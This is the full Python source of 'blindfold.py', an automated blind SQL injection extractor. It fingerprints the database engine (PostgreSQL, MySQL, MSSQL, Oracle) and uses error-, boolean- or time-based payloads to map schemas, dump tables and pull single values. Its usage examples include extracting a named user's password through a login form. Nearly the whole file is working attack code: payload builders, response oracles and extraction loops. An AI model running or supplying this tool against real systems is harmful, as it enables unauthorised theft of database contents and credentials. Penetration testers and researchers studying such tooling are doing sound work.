#!/usr/bin/env python3
"""
blindfold.py - Structured, multi-DBMS blind SQL injection extractor (formerly pg-time-blind).

Despite the historical name, this tool now handles several DBMS and three blind
techniques, choosing automatically:

  PHASE 1 - DETECTION
    1. CONTEXT     : finds where/how the injection breaks out
                     (string vs numeric, AND / OR, stacked).
    2. DBMS        : fingerprints the backend automatically
                     (PostgreSQL, MySQL, MSSQL, Oracle).
    3. TECHNIQUE   : picks the fastest available, preferring
                       error-based  (one-shot dump via a forced DB error)
                     > boolean-based (auto-calibrated TRUE/FALSE signal)
                     > time-based    (sleep oracle, last resort).

  PHASE 2 - EXTRACTION
    - error-based : leaks the whole value in ONE request (chunked if the DBMS
                    truncates error text, e.g. MySQL extractvalue ~32 chars).
    - boolean/time: per-character binary search (~7 requests/char). Boolean
                    extraction can run concurrently with --threads.

SAFETY
  OR-based contexts can change application state (e.g. 'foo' OR 1=1 may match all
  rows / log you in). They are DISABLED by default; pass --allow-or to include them.

RESUME / MEMORY
  Progress + the detected DBMS/technique/context are checkpointed to a JSON state
  file after each character. Re-run the SAME command to auto-resume. --fresh to
  ignore it, --state PATH to choose the file. Deleted automatically on success.

No sqlmap. Only `requests` is required.

----------------------------------------------------------------------
EXAMPLES
  # DEFAULT: just map the DB (DBMS + current database + table list)
  python3 blindfold.py -u http://t:3000/login -d "username=INJECT&password=test"

  # dump a specific table (columns auto-discovered; rows capped by --max-rows)
  python3 blindfold.py -u http://t:3000/login -d "username=INJECT&password=test" \
      --dump users

  # power mode: extract one specific scalar
  python3 blindfold.py -u http://t:3000/login \
      -d "username=INJECT&password=test" \
      --query "SELECT password FROM users WHERE username='antwon'"

  # reuse a Burp request, force MySQL, allow risky OR contexts
  python3 blindfold.py --request req.txt --dbms mysql --allow-or \
      --query "SELECT current_user()"

  # speed up boolean extraction with 8 workers
  python3 blindfold.py -u "http://t/item?id=INJECT" --threads 8 \
      --query "SELECT version()"
----------------------------------------------------------------------
"""
import sys, os, time, json, re, hashlib, argparse, urllib.parse, threading
from concurrent.futures import ThreadPoolExecutor
import requests

requests.packages.urllib3.disable_warnings()

DELIM = "QxZx"                      # marker wrapped around error-based leaks
PROBE = "Prb0"                     # constant used to detect error reflection
TRUE_COND, FALSE_COND = "1=1", "1=2"


# ===========================================================================
# DBMS adapters - each knows its own SQL dialect.
# ===========================================================================
class Dbms:
    name = "generic"
    comment = "-- -"               # works for PG / MySQL / MSSQL / Oracle
    fingerprints = []              # boolean conditions TRUE only on this DBMS
    stacked = False                # supports ; stacked queries
    error_trunc = None            # max chars an error reflects (None = unlimited)

    # --- per-character primitives (override per DBMS) ---
    def length(self, e):  return f"length(({e}))"
    def substr(self, e, p): return f"substr(({e}),{p},1)"
    def asc(self, ch):    return f"ascii({ch})"

    # --- time-based payload fragments (return None if unsupported) ---
    def sleep_inline(self, cond, sleep): return None   # used after AND/OR
    def sleep_stacked(self, cond, sleep): return None  # used after ';'

    # --- error-based: SQL fragment (after AND/OR) that errors out leaking value
    def error_expr(self, inner): return None
    def error_value(self, text):
        m = re.search(re.escape(DELIM) + "(.*?)" + re.escape(DELIM), text, re.S)
        return m.group(1) if m else None

    # --- schema mapping queries (override per DBMS) ---
    list_sep = ","
    row_sep = "|"
    def q_current_db(self): return "SELECT current_database()"
    def q_tables(self):
        return ("SELECT string_agg(table_name,',') FROM information_schema.tables "
                "WHERE table_schema=current_schema()")
    def q_columns(self, t):
        return (f"SELECT string_agg(column_name,',') FROM information_schema.columns "
                f"WHERE table_name='{t}'")
    def q_count(self, t): return f"SELECT count(*) FROM {t}"
    def concat_cols(self, cols):
        return " || '|' || ".join(f"coalesce(cast({c} as text),'')" for c in cols)
    def q_row(self, t, cols, off):
        return f"SELECT {self.concat_cols(cols)} FROM {t} ORDER BY 1 LIMIT 1 OFFSET {off}"


class Postgres(Dbms):
    name = "postgresql"
    stacked = True
    fingerprints = ["(SELECT 1 FROM pg_catalog.pg_tables LIMIT 1)=1"]
    def sleep_inline(self, cond, sleep):
        return f"(CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1"
    def sleep_stacked(self, cond, sleep):
        return f"SELECT pg_sleep({sleep}) WHERE {cond}"
    def error_expr(self, inner):
        return f"1=CAST(('{DELIM}'||({inner})||'{DELIM}') AS int)"


class MySQL(Dbms):
    name = "mysql"
    stacked = False
    error_trunc = 30               # extractvalue reflects ~32 chars total (incl ~)
    fingerprints = ["CONNECTION_ID()>0"]
    def substr(self, e, p): return f"substring(({e}),{p},1)"
    def sleep_inline(self, cond, sleep):
        return f"IF(({cond}),SLEEP({sleep}),0)=0"
    def error_expr(self, inner):
        # single leading ~ marker; survives the ~32-char extractvalue truncation
        return f"extractvalue(1,concat(0x7e,({inner})))"
    def error_value(self, text):
        m = re.search(r"~([^'<>\"]+)", text)
        return m.group(1) if m else None
    def q_current_db(self): return "SELECT database()"
    def q_tables(self):
        return ("SELECT group_concat(table_name) FROM information_schema.tables "
                "WHERE table_schema=database()")
    def q_columns(self, t):
        return (f"SELECT group_concat(column_name) FROM information_schema.columns "
                f"WHERE table_schema=database() AND table_name='{t}'")
    def concat_cols(self, cols):
        return "concat_ws('|'," + ",".join(cols) + ")"
    def q_row(self, t, cols, off):
        return f"SELECT {self.concat_cols(cols)} FROM {t} ORDER BY 1 LIMIT {off},1"


class MSSQL(Dbms):
    name = "mssql"
    stacked = True
    fingerprints = ["@@version LIKE 'Microsoft%'"]
    def length(self, e):  return f"len(({e}))"
    def substr(self, e, p): return f"substring(({e}),{p},1)"
    def sleep_stacked(self, cond, sleep):
        return f"IF ({cond}) WAITFOR DELAY '0:0:{max(1, int(round(sleep)))}'"
    def error_expr(self, inner):
        return f"1=CAST(('{DELIM}'+CAST(({inner}) AS varchar(8000))+'{DELIM}') AS int)"
    def q_current_db(self): return "SELECT DB_NAME()"
    def q_tables(self):
        return ("SELECT STRING_AGG(table_name,',') FROM information_schema.tables "
                "WHERE table_type='BASE TABLE'")
    def q_columns(self, t):
        return (f"SELECT STRING_AGG(column_name,',') FROM information_schema.columns "
                f"WHERE table_name='{t}'")
    def concat_cols(self, cols):
        return "concat(" + ",'|',".join(cols) + ")"
    def q_row(self, t, cols, off):
        return (f"SELECT {self.concat_cols(cols)} FROM {t} "
                f"ORDER BY (SELECT NULL) OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY")


class Oracle(Dbms):
    name = "oracle"
    stacked = False
    fingerprints = ["(SELECT 1 FROM v$version WHERE rownum=1)=1"]
    # boolean works great; time/error left None (handled via boolean fallback)
    def q_current_db(self): return "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual"
    def q_tables(self):
        return "SELECT listagg(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables"
    def q_columns(self, t):
        return (f"SELECT listagg(column_name,',') WITHIN GROUP (ORDER BY column_id) "
                f"FROM user_tab_columns WHERE table_name='{t.upper()}'")
    def concat_cols(self, cols):
        return " || '|' || ".join(f"to_char({c})" for c in cols)
    def q_row(self, t, cols, off):
        return (f"SELECT {self.concat_cols(cols)} FROM "
                f"(SELECT a.*, ROWNUM rn FROM (SELECT * FROM {t} ORDER BY 1) a "
                f"WHERE ROWNUM <= {off+1}) WHERE rn = {off+1}")


DBMS_LIST = [Postgres(), MySQL(), MSSQL(), Oracle()]
DBMS_BY_NAME = {d.name: d for d in DBMS_LIST}


# ===========================================================================
# Injection contexts
# ===========================================================================
class Ctx:
    def __init__(self, name, close, logic, kind):
        self.name, self.close, self.logic, self.kind = name, close, logic, kind

# kind: "bool" contexts also serve error-based; "stacked" only for time
BOOL_CONTEXTS = [
    Ctx("string-and", "'", " AND ", "bool"),
    Ctx("numeric-and", "", " AND ", "bool"),
    Ctx("string-or",  "'", " OR ", "bool"),
    Ctx("numeric-or", "", " OR ", "bool"),
]
STACKED_CONTEXT = Ctx("stacked", "'", "", "stacked")


def boolean_payload(ctx, cond, comment):
    return f"{ctx.close}{ctx.logic}({cond}){comment}"


# ===========================================================================
# HTTP transport
# ===========================================================================
def parse_request_file(path, proto):
    raw = open(path, "r", encoding="utf-8", errors="ignore").read().replace("\r\n", "\n")
    head, _, body = raw.partition("\n\n")
    lines = head.split("\n")
    method, target, _ = (lines[0].split() + ["", "", ""])[:3]
    headers = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            headers[k.strip()] = v.strip()
    host = headers.get("Host", "")
    url = target if target.startswith("http") else f"{proto}://{host}{target}"
    return method, url, headers, body.rstrip("\n")


class Resp:
    __slots__ = ("status", "text", "length", "elapsed")
    def __init__(self, status, text, elapsed):
        self.status, self.text, self.length, self.elapsed = status, text, len(text), elapsed


class Target:
    def __init__(self, a):
        self.a = a
        self.count = 0
        self._lock = threading.Lock()
        if a.request:
            self.method, self.url, self.headers, self.data = parse_request_file(a.request, a.proto)
        else:
            self.url, self.data, self.headers = a.url, a.data, {}
            for h in (a.header or []):
                k, v = h.split(":", 1)
                self.headers[k.strip()] = v.strip()
            self.method = (a.method or ("POST" if a.data else "GET")).upper()
        self.proxies = {"http": a.proxy, "https": a.proxy} if a.proxy else None

    def _enc(self, p):
        return urllib.parse.quote_plus(p) if self.a.encode else p

    def _put(self, s, payload):
        return s.replace(self.a.marker, payload) if s else s

    def send(self, payload):
        payload = self._enc(payload)
        url = self._put(self.url, payload)
        data = self._put(self.data, payload)
        headers = {k: self._put(v, payload) for k, v in self.headers.items()}
        headers.pop("Content-Length", None)
        if data and not any(k.lower() == "content-type" for k in headers):
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        with self._lock:
            self.count += 1
        t = time.time()
        try:
            r = requests.request(self.method, url, data=data, headers=headers,
                                 proxies=self.proxies, verify=False,
                                 timeout=self.a.sleep + 20, allow_redirects=False)
        except requests.exceptions.RequestException as e:
            raise SystemExit(f"\n[!] request error: {e}\n"
                             "    (progress is checkpointed - re-run to resume)")
        return Resp(r.status_code, r.text or "", time.time() - t)


# ===========================================================================
# Oracles - answer "is this SQL condition TRUE?"  (boolean & time)
# ===========================================================================
class Oracle_:
    def __init__(self, target, dbms, ctx, a):
        self.t, self.dbms, self.ctx, self.a = target, dbms, ctx, a
        self.kind = "?"

    def fires(self, cond): raise NotImplementedError

    def length(self, query):
        for n in range(1, self.a.maxlen + 1):
            if self.fires(f"{self.dbms.length(query)}={n}"):
                return n
        return None

    def char(self, query, pos):
        lo, hi = self.a.cmin, self.a.cmax
        expr = self.dbms.asc(self.dbms.substr(query, pos))
        while lo < hi:
            mid = (lo + hi) // 2
            if self.fires(f"{expr}>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo)


class BoolOracle(Oracle_):
    def __init__(self, target, dbms, ctx, a, classifier, signal):
        super().__init__(target, dbms, ctx, a)
        self.kind = "boolean-based"
        self.classify = classifier
        self.signal = signal
    def fires(self, cond):
        p = boolean_payload(self.ctx, cond, self.dbms.comment)
        return self.classify(self.t.send(p))


class TimeOracle(Oracle_):
    def __init__(self, target, dbms, ctx, a):
        super().__init__(target, dbms, ctx, a)
        self.kind = "time-based"
        self.thresh = a.threshold if a.threshold else a.sleep * 0.6
    def _payload(self, cond):
        if self.ctx.kind == "stacked":
            return f"{self.ctx.close};{self.dbms.sleep_stacked(cond, self.a.sleep)}{self.dbms.comment}"
        return f"{self.ctx.close}{self.ctx.logic}{self.dbms.sleep_inline(cond, self.a.sleep)}{self.dbms.comment}"
    def fires(self, cond):
        for attempt in range(self.a.retries + 1):
            slow = self.t.send(self._payload(cond)).elapsed >= self.thresh
            if slow and attempt < self.a.retries:
                continue
            return slow
        return True


# ===========================================================================
# Calibration (auto TRUE/FALSE signal for boolean)
# ===========================================================================
def _stable(vals, jitter):
    return max(vals) - min(vals) <= jitter

def _norm_tokens(text):
    # drop digit-only tokens so timestamps/counters don't poison token matching
    return {w for w in re.sub(r"\d+", "#", text).split() if len(w) >= 3}

def calibrate(target, ctx, a, cond_true=TRUE_COND, cond_false=FALSE_COND):
    if a.true_match:
        return (lambda r: a.true_match in r.text), f"text~'{a.true_match}'"
    if a.false_match:
        return (lambda r: a.false_match not in r.text), f"!text~'{a.false_match}'"
    T = [target.send(boolean_payload(ctx, cond_true, "-- -")) for _ in range(3)]
    F = [target.send(boolean_payload(ctx, cond_false, "-- -")) for _ in range(3)]
    # 1) status code
    st_t, st_f = {r.status for r in T}, {r.status for r in F}
    if len(st_t) == 1 and len(st_f) == 1 and st_t != st_f:
        good = st_t.pop()
        return (lambda r, s=good: r.status == s), f"status=={good}"
    # 2) body length
    lt, lf = [r.length for r in T], [r.length for r in F]
    if _stable(lt, a.len_jitter) and _stable(lf, a.len_jitter):
        ct, cf = sum(lt) / len(lt), sum(lf) / len(lf)
        if abs(ct - cf) >= a.len_margin:
            mid, hi_true = (ct + cf) / 2, ct > cf
            return ((lambda r, m=mid, h=hi_true: (r.length > m) == h),
                    f"len~{int(ct)}vs{int(cf)}")
    # 3) digit-stripped token unique to TRUE (or FALSE)
    tt = [_norm_tokens(r.text) for r in T]
    tf = [_norm_tokens(r.text) for r in F]
    only_t = set.intersection(*tt) - set.union(*tf)
    for tok in sorted(only_t, key=len, reverse=True):
        return (lambda r, k=tok: k in re.sub(r"\d+", "#", r.text)), f"text~'{tok}'"
    only_f = set.intersection(*tf) - set.union(*tt)
    for tok in sorted(only_f, key=len, reverse=True):
        return (lambda r, k=tok: k not in re.sub(r"\d+", "#", r.text)), f"!text~'{tok}'"
    return None


# ===========================================================================
# Detection
# ===========================================================================
def find_boolean(target, a, contexts):
    for ctx in contexts:
        print(f"[*] boolean probe : {ctx.name} ...", flush=True)
        cal = calibrate(target, ctx, a)
        if cal:
            print(f"[+] boolean signal on {ctx.name}: {cal[1]}")
            return ctx, cal
    return None, None

def fingerprint_dbms(target, ctx, classifier, a, candidates):
    """Use the boolean oracle to test each DBMS's unique condition."""
    for d in candidates:
        for fp in d.fingerprints:
            p = boolean_payload(ctx, fp, "-- -")
            if classifier(target.send(p)):
                return d
    return None

def find_time(target, a, contexts, candidates):
    """Try time payloads across DBMS+contexts; the one that fires reveals the DBMS."""
    thresh = a.threshold if a.threshold else a.sleep * 0.6
    for d in candidates:
        ctxs = list(contexts)
        if d.stacked:
            ctxs = ctxs + [STACKED_CONTEXT]
        for ctx in ctxs:
            if ctx.kind == "stacked" and not d.sleep_stacked(TRUE_COND, a.sleep):
                continue
            if ctx.kind != "stacked" and not d.sleep_inline(TRUE_COND, a.sleep):
                continue
            print(f"[*] time probe    : {d.name}/{ctx.name} ...", flush=True)
            o = TimeOracle(target, d, ctx, a)
            if o.fires(FALSE_COND):          # always-slow? not conditional
                continue
            if o.fires(TRUE_COND):
                print(f"[+] time-based fires: {d.name}/{ctx.name}")
                return d, ctx
    return None, None

def find_error(target, dbms, a, contexts):
    """Detect reflected DB errors -> enables one-shot error-based dump."""
    if not dbms.error_expr(PROBE):
        return None
    for ctx in contexts:
        if ctx.kind != "bool":
            continue
        probe_inner = f"'{PROBE}'"
        payload = f"{ctx.close}{ctx.logic}{dbms.error_expr(probe_inner)}{dbms.comment}"
        r = target.send(payload)
        if dbms.error_value(r.text) and PROBE in r.text:
            print(f"[+] error reflection on {ctx.name} ({dbms.name})")
            return ctx
    return None


class Detection:
    def __init__(self, technique, dbms, ctx, oracle=None, classifier=None, signal="", err_ctx=None):
        self.technique, self.dbms, self.ctx = technique, dbms, ctx
        self.oracle, self.classifier, self.signal, self.err_ctx = oracle, classifier, signal, err_ctx


def detect(target, a):
    contexts = list(BOOL_CONTEXTS)
    if not a.allow_or:
        contexts = [c for c in contexts if " OR " not in c.logic]
    candidates = [DBMS_BY_NAME[a.dbms]] if a.dbms else DBMS_LIST

    bool_ctx, cal = (None, None)
    if not a.force_time:
        bool_ctx, cal = find_boolean(target, a, contexts)

    dbms = candidates[0] if a.dbms else None
    if bool_ctx and not a.dbms:
        dbms = fingerprint_dbms(target, bool_ctx, cal[0], a, candidates)
        if dbms:
            print(f"[+] DBMS fingerprint: {dbms.name}")
        else:
            dbms = Postgres()
            print("[!] DBMS fingerprint inconclusive -> defaulting to postgresql")

    # no boolean -> try time (also identifies DBMS)
    time_ctx = None
    if not bool_ctx and not a.force_boolean:
        d2, time_ctx = find_time(target, a, contexts, candidates)
        if d2:
            dbms = d2

    if not dbms:
        return None

    # prefer error-based (one-shot) unless forced away
    if not (a.force_boolean or a.force_time) and not a.no_error:
        err_ctx = find_error(target, dbms, a, contexts)
        if err_ctx:
            return Detection("error-based", dbms, err_ctx, err_ctx=err_ctx)

    if bool_ctx:
        oracle = BoolOracle(target, dbms, bool_ctx, a, cal[0], cal[1])
        return Detection("boolean-based", dbms, bool_ctx, oracle=oracle, classifier=cal[0], signal=cal[1])
    if time_ctx:
        return Detection("time-based", dbms, time_ctx, oracle=TimeOracle(target, dbms, time_ctx, a))
    return None


# ===========================================================================
# Extraction
# ===========================================================================
def extract_error(target, dbms, ctx, a, query=None):
    """One-shot (or chunked) dump via reflected error."""
    query = query if query is not None else a.query
    def leak(inner):
        p = f"{ctx.close}{ctx.logic}{dbms.error_expr(inner)}{dbms.comment}"
        return dbms.error_value(target.send(p).text)

    if not dbms.error_trunc:
        return leak(f"({query})")
    # chunked for DBMS that truncate error text (e.g. MySQL)
    out, start, chunk = "", 1, dbms.error_trunc
    while True:
        piece = leak(f"substring(({query}),{start},{chunk})")
        if not piece:
            break
        out += piece
        if len(piece) < chunk:
            break
        start += chunk
        if start > a.maxlen * 16:        # generous cap for long aggregates
            break
    return out


def extract_search(oracle, a, state_path, sig, value="", length=None):
    q = a.query
    if length is None:
        length = oracle.length(q)
        if length is None:
            return None
        save_state(state_path, sig, length, value, oracle.t.count)
    print(f"[+] length = {length}")

    if a.threads > 1 and oracle.kind == "boolean-based":
        print(f"[*] extracting with {a.threads} workers ...", flush=True)
        todo = list(range(len(value) + 1, length + 1))
        chars = {}
        with ThreadPoolExecutor(max_workers=a.threads) as ex:
            for pos, c in zip(todo, ex.map(lambda p: oracle.char(q, p), todo)):
                chars[pos] = c
        value += "".join(chars[p] for p in sorted(chars))
        save_state(state_path, sig, length, value, oracle.t.count)
        return value

    print(f"[*] extracting: {value}", end="", flush=True)
    try:
        for pos in range(len(value) + 1, length + 1):
            value += oracle.char(q, pos)
            save_state(state_path, sig, length, value, oracle.t.count)
            sys.stdout.write(value[-1]); sys.stdout.flush()
    except KeyboardInterrupt:
        save_state(state_path, sig, length, value, oracle.t.count)
        print(f"\n\n[!] interrupted - progress saved to {state_path}; re-run to resume.")
        sys.exit(130)
    print()
    return value


# ===========================================================================
# Schema mapping  (default action) and table dump
# ===========================================================================
def _bin_length(oracle, query, cap):
    """Length of the scalar via binary search on length(query) (handles long values)."""
    lenexpr = oracle.dbms.length(query)
    hi = 1
    while hi < cap and oracle.fires(f"{lenexpr}>{hi}"):
        hi *= 2
    hi = min(hi, cap)
    lo = 0
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle.fires(f"{lenexpr}>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo


def read_scalar(target, det, a, query, cap=4096):
    """Extract one scalar with the detected technique (no checkpoint; for map/dump)."""
    if det.technique == "error-based":
        return extract_error(target, det.dbms, det.ctx, a, query)
    o = det.oracle
    n = _bin_length(o, query, cap)
    if n == 0:
        return ""
    if a.threads > 1 and o.kind == "boolean-based":
        with ThreadPoolExecutor(max_workers=a.threads) as ex:
            chars = list(ex.map(lambda p: o.char(query, p), range(1, n + 1)))
        return "".join(chars)
    return "".join(o.char(query, p) for p in range(1, n + 1))


def _split_list(s):
    return [x for x in re.split(r",", s or "") if x != ""]


def map_mode(target, det, a):
    db = read_scalar(target, det, a, det.dbms.q_current_db())
    tables = _split_list(read_scalar(target, det, a, det.dbms.q_tables()))
    print("\n=== DATABASE MAP ===")
    print(f"DBMS     : {det.dbms.name}")
    print(f"Database : {db}")
    print(f"Tables   : {len(tables)}")
    for t in tables:
        print(f"  - {t}")
    print(f"\n[i] dump a table with:  --dump <table>   (rows capped by --max-rows)")


def dump_mode(target, det, a):
    table = a.dump
    cols = _split_list(read_scalar(target, det, a, det.dbms.q_columns(table)))
    if not cols:
        print(f"[!] no columns found for '{table}' (wrong name or schema?)")
        return
    raw = read_scalar(target, det, a, det.dbms.q_count(table)) or "0"
    count = int(re.sub(r"[^0-9]", "", raw) or "0")
    limit = min(count, a.max_rows)
    print(f"\n=== DUMP: {table} ===")
    print(f"columns ({len(cols)}): {', '.join(cols)}")
    print(f"rows: {count}" + (f"  (showing first {limit}, raise with --max-rows)" if count > limit else ""))
    rows = []
    for i in range(limit):
        cells = (read_scalar(target, det, a, det.dbms.q_row(table, cols, i)) or "").split("|")
        rows.append((cells + [""] * len(cols))[:len(cols)])
    widths = [len(c) for c in cols]
    for r in rows:
        for j, cell in enumerate(r):
            widths[j] = max(widths[j], len(cell))
    line = lambda vals: " | ".join(v.ljust(widths[j]) for j, v in enumerate(vals))
    print("\n" + line(cols))
    print("-+-".join("-" * w for w in widths))
    for r in rows:
        print(line(r))


# ---------------------------- resume / checkpoint ----------------------------
def job_signature(a, det, target):
    raw = "|".join([target.method, target.url or "", target.data or "",
                    det.technique, det.dbms.name, det.ctx.name, a.query or "",
                    str(a.sleep), str(a.cmin), str(a.cmax)])
    return hashlib.sha1(raw.encode()).hexdigest()[:10]

def load_state(path, sig):
    try:
        d = json.load(open(path))
        if d.get("sig") == sig:
            return d
    except Exception:
        pass
    return None

def save_state(path, sig, length, value, count):
    tmp = path + ".tmp"
    with open(tmp, "w") as f:
        json.dump({"sig": sig, "length": length, "value": value, "count": count}, f)
    os.replace(tmp, path)


def main():
    ap = argparse.ArgumentParser(
        description="blindfold - auto-detecting blind SQLi extractor (DBMS + error/boolean/time)")
    src = ap.add_argument_group("target (use -u/-d/-H  OR  --request)")
    src.add_argument("-u", "--url"); src.add_argument("-d", "--data")
    src.add_argument("-H", "--header", action="append")
    src.add_argument("-X", "--method"); src.add_argument("--request")
    src.add_argument("--proto", default="http")

    act = ap.add_argument_group("action (default: map the database)")
    act.add_argument("--query", help="extract a single SQL scalar (power mode)")
    act.add_argument("--dump", metavar="TABLE", help="dump rows of TABLE (columns auto-discovered)")
    act.add_argument("--max-rows", type=int, default=50, dest="max_rows", help="row cap for --dump (default 50)")

    inj = ap.add_argument_group("injection")
    inj.add_argument("--marker", default="INJECT")
    inj.add_argument("--no-encode", dest="encode", action="store_false")

    det = ap.add_argument_group("detection")
    det.add_argument("--dbms", choices=list(DBMS_BY_NAME), help="pin the DBMS (skip fingerprinting)")
    det.add_argument("--force-boolean", action="store_true")
    det.add_argument("--force-time", action="store_true")
    det.add_argument("--no-error", action="store_true", help="don't use error-based even if available")
    det.add_argument("--allow-or", action="store_true", help="include risky OR contexts (may change app state)")
    det.add_argument("--true-match", help="string only in a TRUE response (overrides calibration)")
    det.add_argument("--false-match", help="string only in a FALSE response")
    det.add_argument("--len-margin", type=int, default=12)
    det.add_argument("--len-jitter", type=int, default=4)

    tun = ap.add_argument_group("tuning")
    tun.add_argument("--sleep", type=float, default=3.0)
    tun.add_argument("--threshold", type=float, default=0.0)
    tun.add_argument("--retries", type=int, default=1)
    tun.add_argument("--threads", type=int, default=1, help="parallel workers for boolean extraction")
    tun.add_argument("--maxlen", type=int, default=64)
    tun.add_argument("--cmin", type=int, default=32)
    tun.add_argument("--cmax", type=int, default=126)
    tun.add_argument("--proxy")

    res = ap.add_argument_group("resume")
    res.add_argument("--state"); res.add_argument("--fresh", action="store_true")

    ap.set_defaults(encode=True)
    a = ap.parse_args()
    if not a.request and not a.url:
        ap.error("provide -u/--url (with -d/-H) or --request")
    if a.force_boolean and a.force_time:
        ap.error("--force-boolean and --force-time are mutually exclusive")
    if a.query and a.dump:
        ap.error("--query and --dump are mutually exclusive")

    target = Target(a)

    print("=== PHASE 1: detection ===")
    det = detect(target, a)
    if not det:
        print("\n[!] no blind injection detected.")
        print("    try --allow-or, --dbms, --force-time, --true-match, or check marker placement.")
        sys.exit(1)
    print(f"\n[+] DBMS      : {det.dbms.name}")
    print(f"[+] TECHNIQUE : {det.technique}")
    print(f"[+] CONTEXT   : {det.ctx.name}" + (f"  signal={det.signal}" if det.signal else ""))
    print(f"[*] detection cost: {target.count} requests")

    # ---- action dispatch ----
    if a.dump:
        dump_mode(target, det, a)
        print(f"\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
        return
    if not a.query:
        map_mode(target, det, a)
        print(f"\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
        return

    # ---- --query : single scalar with resume ----
    print("\n=== EXTRACTION ===")
    sig = job_signature(a, det, target)
    state_path = a.state or f".pgtb-{sig}.json"
    print(f"[*] query : {a.query}")

    if det.technique == "error-based":
        val = extract_error(target, det.dbms, det.ctx, a)
        if not val:
            print("[!] error-based dump returned nothing; re-run with --no-error to fall back.")
            sys.exit(1)
        print(f"\n[+] RESULT: {val}\n[*] total requests: {target.count}  (error-based, {det.dbms.name})")
        return

    print(f"[*] state : {state_path}")
    value, length = "", None
    if not a.fresh:
        st = load_state(state_path, sig)
        if st:
            length, value = st.get("length"), st.get("value", "")
            print(f"[*] resuming: {len(value)}/{length} -> '{value}'")
    val = extract_search(det.oracle, a, state_path, sig, value, length)
    if val is None:
        print("[!] length not found (empty result, bad query, or maxlen too low)")
        sys.exit(1)
    print(f"\n[+] RESULT: {val}\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
    try:
        os.remove(state_path)
    except OSError:
        pass


if __name__ == "__main__":
    main()
